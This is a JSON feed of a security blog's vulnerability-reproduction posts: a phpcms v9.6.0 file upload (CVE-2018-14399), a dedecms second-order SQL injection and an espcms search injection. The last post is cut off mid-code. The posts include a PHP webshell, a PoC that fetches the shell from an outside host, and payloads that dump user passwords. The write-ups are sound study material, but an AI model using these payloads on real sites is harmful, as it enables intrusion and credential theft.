{
    "version": "https://jsonfeed.org/version/1",
    "title": "逐梦 • All posts by \"漏洞复现\" category",
    "description": "Welcome to my blog",
    "home_page_url": "https://0xdadream.github.io",
    "items": [
        {
            "id": "https://0xdadream.github.io/2021/12/02/phpcmsv9.6.0-ren-yi-wen-jian-shang-chuan-lou-dong/",
            "url": "https://0xdadream.github.io/2021/12/02/phpcmsv9.6.0-ren-yi-wen-jian-shang-chuan-lou-dong/",
            "title": "phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399",
            "date_published": "2021-12-02T13:11:00.000Z",
            "content_html": "<h1 id=\"phpcmsv9-6-0任意文件上传漏洞CVE-2018-14399\"><a href=\"#phpcmsv9-6-0任意文件上传漏洞CVE-2018-14399\" class=\"headerlink\" title=\"phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399\"></a>phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399</h1><h2 id=\"搭建环境\"><a href=\"#搭建环境\" class=\"headerlink\" title=\"搭建环境\"></a>搭建环境</h2><p>下载phpcmsv9.6.0，然后安装</p>\n<p>登录到后台</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/e0e5d69445e98d8dea8663a94929c0ce.jpg\"></p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>进入注册页面，填写注册信息</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/35792f526406248ea5cf080047820369.png\"></p>\n<p>点击注册bp抓包</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/cc4b00f681c6f7fbca23b81c6e795726.png\"></p>\n<p>在另一个开启web服务的主机的web根目录下创建一个txt文件，写入一句话木马</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">eavl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>构造poc</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">siteid</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">modelid</span><span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">username</span><span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">password</span><span class=\"token operator\">=</span>testtest<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">pwdconfirm</span><span class=\"token operator\">=</span>testtest<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">email</span><span class=\"token operator\">=</span>test%40gmail.com<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">nickname</span><span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span>info<span class=\"token punctuation\">[</span>content<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>img <span class=\"token assign-left variable\">src</span><span class=\"token operator\">=</span>http://xxxxxip/shell.txt?.php<span class=\"token comment\">#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>添加poc到包中</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/3b48dde6309666674c3b12712b704fb9.png\"></p>\n<p>发送包，然后从响应中获得shell.php的路径，再通过蚁剑连接</p>\n",
            "tags": [
                "代码审计",
                "漏洞复现",
                "文件上传"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/11/30/dedecms-er-ci-zhu-ru-lou-dong/",
            "url": "https://0xdadream.github.io/2021/11/30/dedecms-er-ci-zhu-ru-lou-dong/",
            "title": "dedecms二次注入漏洞",
            "date_published": "2021-11-30T13:11:00.000Z",
            "content_html": "<h1 id=\"dedecms二次注入漏洞\"><a href=\"#dedecms二次注入漏洞\" class=\"headerlink\" title=\"dedecms二次注入漏洞\"></a>dedecms二次注入漏洞</h1><h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>首先搭建环境，注意php版本不要大于5.3，安装完后删除install文件夹</p>\n<p>进入主页是这样的</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/a72c0587bfe3f74f402b1314c92e3107.png\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>漏洞点在<code>\\dedecms\\plus\\feedback.php</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//保存评论内容</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$comtype</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'comments'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token variable\">$arctitle</span> <span class=\"token operator\">=</span> <span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$title</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token variable\">$inquery</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`)\n\t               VALUES ('<span class=\"token interpolation\"><span class=\"token variable\">$aid</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$typeid</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$arctitle</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$ip</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$ischeck</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$dtime</span></span>', '<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$cfg_ml</span><span class=\"token operator\">-&gt;</span><span class=\"token constant\">M_ID</span><span class=\"token punctuation\">}</span></span>','0','0','<span class=\"token interpolation\"><span class=\"token variable\">$feedbacktype</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$face</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$msg</span></span>'); \"</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$rs</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$dsql</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">ExecuteNoneQuery</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$inquery</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$rs</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token punctuation\">{</span>\n\t\t\t\t<span class=\"token function\">ShowMsg</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' 发表评论错误! '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'-1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token comment\">//echo $dsql-&gt;GetError();</span>\n\t\t\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>$arctitle = addslashes($title);</code>，把传进来的内容转义了，然后下面insert把转义后的内容插入到数据库，这儿没有什么异常</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//引用回复</span>\n\t<span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$comtype</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'reply'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$dsql</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">GetOne</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Select * from `#@__feedback` where id ='<span class=\"token interpolation\"><span class=\"token variable\">$fid</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$arctitle</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'arctitle'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$aid</span> <span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'aid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$quotemsg</span><span class=\"token operator\">.</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token function\">HtmlReplace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$inquery</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`)\n\t\t\t\tVALUES ('<span class=\"token interpolation\"><span class=\"token variable\">$aid</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$typeid</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$arctitle</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$ip</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$ischeck</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$dtime</span></span>','<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$cfg_ml</span><span class=\"token operator\">-&gt;</span><span class=\"token constant\">M_ID</span><span class=\"token punctuation\">}</span></span>','0','0','<span class=\"token interpolation\"><span class=\"token variable\">$feedbacktype</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$face</span></span>','<span class=\"token interpolation\"><span class=\"token variable\">$msg</span></span>')\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$dsql</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">ExecuteNoneQuery</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$inquery</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>$row = $dsql-&gt;GetOne(\"Select * from </code>#@__feedback<code> where id ='$fid'\");</code></p>\n<p><code>$arctitle = $row['arctitle'];</code></p>\n<p>这两句代码将id为fid的评论的读取出来，并将之前保存的标题赋值给arctitle，然后再将这个值插入数据库中，这时插入的值是没有经过addslashes转义的，这就导致了二次注入</p>\n<h2 id=\"操作\"><a href=\"#操作\" class=\"headerlink\" title=\"操作\"></a>操作</h2><p>先用管理员账号新增一个栏目用来发表文章dedecms/dede/</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/2ee04dc00404e80bc7030a47fd2728e5.png\"></p>\n<p>注册一个普通用户用来做测试对象</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/39d4e1964304da5688416a73e8538e61.png\"></p>\n<p>进入主页随便发布一篇文章</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/9280b647ce4c8b5b9d7da0dbf1bafd37.png\"></p>\n<p>第一次注入</p>\n<p>根据代码构造payload</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">get  http:<span class=\"token comment\">//dedecms/plus/feedback.php?aid=1</span>\n\npost  <span class=\"token keyword\">action</span><span class=\"token operator\">=</span>send<span class=\"token operator\">&amp;</span>comtype<span class=\"token operator\">=</span>comments<span class=\"token operator\">&amp;</span>aid<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>isconfirm<span class=\"token operator\">=</span>yes<span class=\"token operator\">&amp;</span>msg<span class=\"token operator\">=</span>xx<span class=\"token operator\">&amp;</span>validate<span class=\"token operator\">=</span>GVZH<span class=\"token operator\">&amp;</span>title<span class=\"token operator\">=</span>xx<span class=\"token string\">',(char(@`'</span><span class=\"token punctuation\">`</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>aid为文章ID号，action为处理方式，comtype为操作方式，vaildate为验证码，也能注释掉方便测试，title未标题，构建payload的地方，其他参数审计得到</p>\n<p>注释验证码</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/146b7de895917c4e4086cd4707925e9a.png\"></p>\n<p>执行注入就会发表一条评论，可以看到注入单引号被转义了</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/219fb762991726610f47e58e92b613b8.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/b2b61c5c5cbcc9b89a5a1c42fbfb882c.png\"></p>\n<p>第二次注入</p>\n<p>在第一条评论上注入</p>\n<p>fid为评论的ID号</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">get  http:<span class=\"token comment\">//dedecms/plus/feedback.php?aid=1</span>\n\npost  <span class=\"token keyword\">action</span><span class=\"token operator\">=</span>send<span class=\"token operator\">&amp;</span>comtype<span class=\"token operator\">=</span>reply<span class=\"token operator\">&amp;</span>fid<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>isconfirm<span class=\"token operator\">=</span>yes<span class=\"token operator\">&amp;</span>validate<span class=\"token operator\">=</span>xx<span class=\"token operator\">&amp;</span>msg<span class=\"token operator\">=</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span><span class=\"token comment\">/**/</span>concat<span class=\"token punctuation\">(</span>userid<span class=\"token punctuation\">,</span><span class=\"token number\">0x3a</span><span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">from</span><span class=\"token comment\">/**/</span>xxxxx_member<span class=\"token comment\">/**/</span><span class=\"token keyword\">limit</span><span class=\"token comment\">/**/</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/d554ba1d0411ed7e7d75dd7b518d86bc.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/838befebdd5c5dccd8ecdae24f1a6fb9.png\"></p>\n<p>这里可以证实读取出来的acrtitle是没有转义的，再和msg拼接就造成了恶意sql代码的执行，并且把执行结果暴露出来了</p>\n<p>至此复现成功</p>\n<p>这里贴一下后台的数据库</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/e31b87f57662165e6b344e557bcabaec.png\"></p>\n",
            "tags": [
                "sql",
                "代码审计",
                "漏洞复现"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/11/25/espcms-sou-suo-zhu-ru/",
            "url": "https://0xdadream.github.io/2021/11/25/espcms-sou-suo-zhu-ru/",
            "title": "espcms搜索注入",
            "date_published": "2021-11-25T13:11:00.000Z",
            "content_html": "<h1 id=\"espcms搜索注入\"><a href=\"#espcms搜索注入\" class=\"headerlink\" title=\"espcms搜索注入\"></a>espcms搜索注入</h1><h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>二次urldecode注入</p>\n<p>使用了<code>urldecode</code>或者<code>rawurldecode</code>函数可能会导致单引号（’）、双引号（”）、反斜杠（/）等符号被注入到语句，进而产生漏洞</p>\n<p><code>addslashes()</code>、<code>mysql_real_escape_string()</code>、<code>mysql_escape_string()</code>等函数能对<code>urldecode()</code>后的结果处理，从而避免产生漏洞</p>\n<p>eg:</p>\n<p><code>xx.php?id=1%2527</code>，浏览器接收后先进行一次自解码<code>id=1%27</code>，%25解码为%，<code>urlencode()</code>再解码，变成<code>id=1'</code>，产生注入漏洞</p>\n<p>代码审计的时候可以通过搜索这两个函数<code>urldecode</code>或者<code>rawurldecode</code>来寻找漏洞</p>\n<h2 id=\"操作演示\"><a href=\"#操作演示\" class=\"headerlink\" title=\"操作演示\"></a>操作演示</h2><p>先搭建环境，进入首页，配置好数据库及其他配置</p>\n<p>漏洞在<code>interface/search.php</code>文件和<code>interface/3gwap_search.php</code>文件<code>in_taglist()</code>函数</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/59195d643c2222e1700406d1010483c0.png\"></p>\n<p>可以看到一个搜索框和两个参数，审计代码</p>\n<p>代码中有三个函数，<code>in_list(),in_result(),in_taglist()</code>，第二函数应该是调用函数，阅读代码得到第三个参数是tagkey</p>\n<p>函数代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">in_taglist</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">start_pagetemplate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">include_once</span> admin_ROOT <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'public/class_pagebotton.php'</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token variable\">$page</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">fun</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'G'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$page</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$lng</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>admin_LNG <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'big5'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token constant\">CON</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'is_lancode'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> admin_LNG<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$tagkey</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">fun</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tagkey'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'R'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$tagkey</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">fun</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">inputcodetrim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tagkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token variable\">$db_where</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">' WHERE lng=\\''</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$lng</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'\\' AND isclass=1'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tagkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token variable\">$linkURL</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_REFERER'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">callmessage</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">lng</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'search_err'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$linkURL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">lng</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gobackbotton'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tagkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token variable\">$db_where</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\" AND FIND_IN_SET('<span class=\"token interpolation\"><span class=\"token variable\">$tagkey</span></span>',tags)\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token variable\">$pagemax</span> <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token variable\">$pagesylte</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token variable\">$templatesDIR</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_templatesdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'article'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token variable\">$templatefilename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$lng</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$templatesDIR</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/search'</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token variable\">$db_table</span> <span class=\"token operator\">=</span> db_prefix <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'document'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$countnum</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">db_numrows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db_table</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$db_where</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$countnum</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n\t\t\t<span class=\"token variable\">$numpage</span> <span class=\"token operator\">=</span> <span class=\"token function\">ceil</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$countnum</span> <span class=\"token operator\">/</span> <span class=\"token variable\">$pagemax</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token variable\">$numpage</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,\n\t\t\tcolor,author,source,pic,link,oprice,bprice,click,description,keywords,addtime,template,filename,filepath FROM <span class=\"token interpolation\"><span class=\"token variable\">$db_table</span></span> <span class=\"token interpolation\"><span class=\"token variable\">$db_where</span></span> LIMIT 0,<span class=\"token interpolation\"><span class=\"token variable\">$pagemax</span></span>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">htmlpage</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PageBotton</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pagemax</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$countnum</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$numpage</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pagesylte</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token constant\">CON</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file_fileex'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">lng</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pagebotton'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">lng</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gopageurl'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token constant\">CON</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'is_rewrite'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">htmlpage</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">PageSQL</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pid,did'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'down'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$rs</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">db</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span 